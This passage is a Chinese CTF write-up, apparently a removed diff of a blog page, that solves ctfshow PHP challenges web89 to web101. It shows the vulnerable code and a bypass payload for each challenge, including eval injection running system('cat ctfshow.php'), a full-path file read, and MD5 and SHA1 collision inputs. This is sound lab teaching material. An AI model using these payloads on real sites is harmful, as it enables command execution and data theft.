-    if(preg_match(&amp;quot;/[0-9]/&amp;quot;, $num))&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(intval($num))&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;首先 intval () 函数是用于获取变量的整数值&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111192534964.png&#34; alt=&#34;image-20230111192534964&#34; /&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-$num=&amp;quot;1&amp;quot;;
-echo preg_match(&amp;quot;/[0-9]/&amp;quot;, $num).&amp;quot;\n&amp;quot;;
-echo intval($num).&amp;quot;\n&amp;quot;;
-$w=&amp;quot;a&amp;quot;;
-echo preg_match(&amp;quot;/[0-9]/&amp;quot;, $w).&amp;quot;\n&amp;quot;;
-echo intval($w).&amp;quot;\n&amp;quot;;
-$q=&amp;quot;1a&amp;quot;;
-echo preg_match(&amp;quot;/[0-9]/&amp;quot;, $q).&amp;quot;\n&amp;quot;;
-echo intval($q).&amp;quot;\n&amp;quot;;
-$a[]=&amp;quot;a&amp;quot;;
-echo @preg_match(&amp;quot;/[0-9]/&amp;quot;, $a).&amp;quot;\n&amp;quot;;
-echo @intval($a);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;运行结果&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107173642929.png&#34; alt=&#34;image-20221107173642929&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里可以看到，当变量为数字时两个函数返回值都是 1，当变量为字母的时候，两个函数返回的都是 0，当变量是字符串的时候，当变量中是由数字的字符串时函数的返回值为 1，但是当变量为数组时，preg_match 的返回值为空而 intval 的返回值为一，所以这里可以使用数组绕过&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/?num[]=1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107174022859.png&#34; alt=&#34;image-20221107174022859&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web90&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web90&#34;&gt;#&lt;/a&gt; web90&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;num&#39;]))&amp;#123;
-    $num = $_GET[&#39;num&#39;];
-    if($num===&amp;quot;4476&amp;quot;)&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(intval($num,0)===4476)&amp;#123;
-        echo $flag;
-    &amp;#125;else&amp;#123;
-        echo intval($num,0);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;根据上面提到的特性，这里直接传进去一个 4476 + 字母即可&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;?num=4476a
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107190716542.png&#34; alt=&#34;image-20221107190716542&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web91&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web91&#34;&gt;#&lt;/a&gt; web91&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-show_source(__FILE__);
-include(&#39;flag.php&#39;);
-$a=$_GET[&#39;cmd&#39;];
-if(preg_match(&#39;/^php$/im&#39;, $a))&amp;#123;
-    if(preg_match(&#39;/^php$/i&#39;, $a))&amp;#123;
-        echo &#39;hacker&#39;;
-    &amp;#125;
-    else&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-else&amp;#123;
-    echo &#39;nonononono&#39;;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里是正则的一个小特性，可以去看看我的&lt;a href=&#34;https://blog.xcu.icu/2022/11/09/preg_match&amp;amp;&amp;amp;%E6%AD%A3%E5%88%99/&#34;&gt; preg_match&amp;amp;&amp;amp; 正则 - Web | Clown の Blog = (xcu.icu)&lt;/a&gt; 这篇文章，绕过这个的方法也不难，第一个是多行匹配，第二个是只匹配一行，且遇到换行返回空&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?cmd=a%0aphp
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109231302790.png&#34; alt=&#34;image-20221109231302790&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web92&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web92&#34;&gt;#&lt;/a&gt; web92&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;num&#39;]))&amp;#123;
-    $num = $_GET[&#39;num&#39;];
-    if($num==4476)&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(intval($num,0)==4476)&amp;#123;
-        echo $flag;
-    &amp;#125;else&amp;#123;
-        echo intval($num,0);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;intval 获取变量的整数值，前面又不能相等，但是它又加了一个 0，这里用 e 来构造科学计数法或者写一个小数都行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?num=4476.1
-?num=4476e1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109232250065.png&#34; alt=&#34;image-20221109232250065&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web93&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web93&#34;&gt;#&lt;/a&gt; web93&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;num&#39;]))&amp;#123;
-    $num = $_GET[&#39;num&#39;];
-    if($num==4476)&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(preg_match(&amp;quot;/[a-z]/i&amp;quot;, $num))&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(intval($num,0)==4476)&amp;#123;
-        echo $flag;
-    &amp;#125;else&amp;#123;
-        echo intval($num,0);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;不让用字母了，那就用小数点呗&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?num=4476.1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109232530653.png&#34; alt=&#34;image-20221109232530653&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;还能用进制转换&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;二进制0bxxx
-八进制0xxxxxx
-十六进制0xaaaa
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;二进制和十六进制想正常识别都有字母，只有八进制能用了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109233000924.png&#34; alt=&#34;image-20221109233000924&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web94&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web94&#34;&gt;#&lt;/a&gt; web94&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;num&#39;]))&amp;#123;
-    $num = $_GET[&#39;num&#39;];
-    if($num===&amp;quot;4476&amp;quot;)&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(preg_match(&amp;quot;/[a-z]/i&amp;quot;, $num))&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(!strpos($num, &amp;quot;0&amp;quot;))&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(intval($num,0)===4476)&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;strpos () f 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）&lt;/p&gt;
-&lt;p&gt;那就继续小数点解决，第一次出现的位置，加一个空格干扰一下就行&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110001332708.png&#34; alt=&#34;image-20221110001332708&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web95&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web95&#34;&gt;#&lt;/a&gt; web95&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;num&#39;]))&amp;#123;
-    $num = $_GET[&#39;num&#39;];
-    if($num==4476)&amp;#123;
-        die(&amp;quot;no no no!&amp;quot;);
-    &amp;#125;
-    if(preg_match(&amp;quot;/[a-z]|\./i&amp;quot;, $num))&amp;#123;
-        die(&amp;quot;no no no!!&amp;quot;);
-    &amp;#125;
-    if(!strpos($num, &amp;quot;0&amp;quot;))&amp;#123;
-        die(&amp;quot;no no no!!!&amp;quot;);
-    &amp;#125;
-    if(intval($num,0)===4476)&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;小数点被加入黑名单了，那就使用空格干扰&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003134354.png&#34; alt=&#34;image-20221110003134354&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web96&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web96&#34;&gt;#&lt;/a&gt; web96&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-if(isset($_GET[&#39;u&#39;]))&amp;#123;
-    if($_GET[&#39;u&#39;]==&#39;flag.php&#39;)&amp;#123;
-        die(&amp;quot;no no no&amp;quot;);
-    &amp;#125;else&amp;#123;
-        highlight_file($_GET[&#39;u&#39;]);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里先引出报错&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003333642.png&#34; alt=&#34;image-20221110003333642&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;看到文件路径，这里传入完整路径就可以了&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;?u=/var/www/html/flag.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003509585.png&#34; alt=&#34;image-20221110003509585&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web97&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web97&#34;&gt;#&lt;/a&gt; web97&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &amp;#123;
-if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])
-if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
-echo $flag;
-else
-print &#39;Wrong.&#39;;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;人见人爱的 MD5 强碰撞，这里给出几个 MD5 和 hash 的强碰撞，简单点的数组绕过就行&lt;/p&gt;
-&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$a=&#34;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&#34;;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$b=&#34;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&#34;;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;array1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0&amp;amp;array2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#sha1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;传就完事，注意别用 hackbar 会编码一次再发送&lt;/p&gt;
-&lt;h2 id=&#34;web98&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web98&#34;&gt;#&lt;/a&gt; web98&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-$_GET?$_GET=&amp;amp;$_POST:&#39;flag&#39;;
-$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;amp;$_COOKIE:&#39;flag&#39;;
-$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;amp;$_SERVER:&#39;flag&#39;;
-highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__);
-
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;三元运算符和地址传递&lt;/p&gt;
-&lt;p&gt;首先第一个三元运算，如果有 get 传参就将 post 的地址传给 get，最后一个是如果 $_GET [&#39;HTTP_FLAG&#39;]==&#39;flag&#39; 就打印 flag，否则就会高亮当前文件，第二个和第三个这里似乎没有用上&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110225715098.png&#34; alt=&#34;image-20221110225715098&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web99&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web99&#34;&gt;#&lt;/a&gt; web99&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-$allow = array();
-for ($i=36; $i &amp;lt; 0x36d; $i++) &amp;#123; 
-    array_push($allow, rand(1,$i));
-&amp;#125;
-if(isset($_GET[&#39;n&#39;]) &amp;amp;&amp;amp; in_array($_GET[&#39;n&#39;], $allow))&amp;#123;
-    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;array_push () 函数向数组尾部插入一个或多个元素。&lt;/p&gt;
-&lt;p&gt;in_array () 函数搜索数组中是否存在指定的值。这题的点也是在这这个函数有三个参数，像题目中两个是必须的，第三个参数是可选择的如果为 ture 则判断第一个参数（被检索的值）和第二个参数（检索的字母）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110233741927.png&#34; alt=&#34;image-20221110233741927&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里可以，用 1.php 去尝试，会被识别为 1，如果相同则写入 1.php 中&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110233730400.png&#34; alt=&#34;image-20221110233730400&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web100&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web100&#34;&gt;#&lt;/a&gt; web100&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-include(&amp;quot;ctfshow.php&amp;quot;);
-//flag in class ctfshow;
-$ctfshow = new ctfshow();
-$v1=$_GET[&#39;v1&#39;];
-$v2=$_GET[&#39;v2&#39;];
-$v3=$_GET[&#39;v3&#39;];
-$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
-if($v0)&amp;#123;
-    if(!preg_match(&amp;quot;/\;/&amp;quot;, $v2))&amp;#123;
-        if(preg_match(&amp;quot;/\;/&amp;quot;, $v3))&amp;#123;
-            eval(&amp;quot;$v2(&#39;ctfshow&#39;)$v3&amp;quot;);
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;首先 $v0=is_numeric ($v1) and is_numeric ($v2) and is_numeric ($v3); 这里要让其值为 true，然后进入 if 语句&lt;/p&gt;
-&lt;p&gt;判断三个数都为数字或者数字字符串才行，但是这里等号的运算优先级比 and 要高&lt;/p&gt;
-&lt;p&gt;&amp;amp;&amp;amp; &amp;gt; || &amp;gt; = &amp;gt; and &amp;gt; or&lt;/p&gt;
-&lt;p&gt;所以这里后面的 v2 和 v3 似乎没啥用，v2 不能有；v3 要有；，这里还要将中间的 ctfshow 干扰给过滤了，可以用多行注释，直接用？&amp;gt; 结束也行&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;?v1=1&amp;amp;v2=var_dump($ctfshow)/*&amp;amp;v3=*/;
-?v1=1&amp;amp;v2=system(%27cat%20ctfshow.php%27)/*&amp;amp;v3=*/;
-?v1=1&amp;amp;v2=var_dump($ctfshow)?&amp;gt;&amp;amp;v3=;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;web101&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web101&#34;&gt;#&lt;/a&gt; web101&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-include(&amp;quot;ctfshow.php&amp;quot;);
-//flag in class ctfshow;
-$ctfshow = new ctfshow();
-$v1=$_GET[&#39;v1&#39;];
-$v2=$_GET[&#39;v2&#39;];
-$v3=$_GET[&#39;v3&#39;];
-$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
-if($v0)&amp;#123;
-    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&amp;#123;|\[|\&amp;quot;|\&#39;|\,|\.|\;|\?|[0-9]/&amp;quot;, $v2))&amp;#123;
-        if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&amp;#123;|\[|\&amp;quot;|\&#39;|\,|\.|\?|[0-9]/&amp;quot;, $v3))&amp;#123;
-            eval(&amp;quot;$v2(&#39;ctfshow&#39;)$v3&amp;quot;);
-        &amp;#125;
-    &amp;#125;
-    
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;跟上一题相比较挺突然，突然过滤了好多东西，经观察，v3 还是可以有 &amp;quot;;&amp;quot;，这里要使用 php 反射，先浅浅的记录一下什么是 php 反射&lt;/p&gt;
-&lt;h3 id=&#34;php反射&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php反射&#34;&gt;#&lt;/a&gt; php 反射&lt;/h3&gt;
-&lt;p&gt;算的上是 php 中的一种非常普遍的高级操作，几乎在所有的 php 框架或是说工具中都能见到反射的身影，那么什么是反射？&lt;/p&gt;
